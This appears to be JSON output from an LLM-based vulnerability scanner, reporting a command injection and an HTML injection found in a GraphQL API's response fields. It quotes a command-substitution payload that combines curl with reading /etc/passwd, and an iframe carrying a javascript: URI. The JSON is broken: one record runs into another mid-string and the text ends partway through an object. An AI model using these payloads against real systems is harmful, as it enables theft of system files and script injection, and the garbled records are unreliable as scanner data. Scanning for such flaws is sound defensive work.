[{"detection_name": "LLM: os_command_injection", "detection": "vulnerable", "category": "Injection Attacks", "description": "The response contains a command injection payload in the 'symbol' field: $(curl ... $(cat /etc/passwd)). [{"detection_name": "LLM: html_injection", "detection": "vulnerable", "category": "Injection Attacks", "description": "The GraphQL response returns unsanitized user-controlled HTML content in the 'country' field. The presence of an embedded <iframe> tag with a JavaScript URI demonstrates HTML injection, as raw HTML markup is stored and reflected without proper encoding. This could enable attackers to manipulate page content, though actual script execution might depend on client-side rendering contexts.", "evidence": "<iframe src='javascript:alert(document.domain)'> in 'country' field", "confidence": 0.9, "llm_analysis": {"is_vulnerable": true, "vulnerability_type": "html_injection", "severity": "HIGH", "confidence": 0.9, "evidence": "<iframe src='javascript:alert(document.domain)'> in 'country' field", "explanation": "The GraphQL response returns unsanitized user-controlled HTML content in the 'country' field.
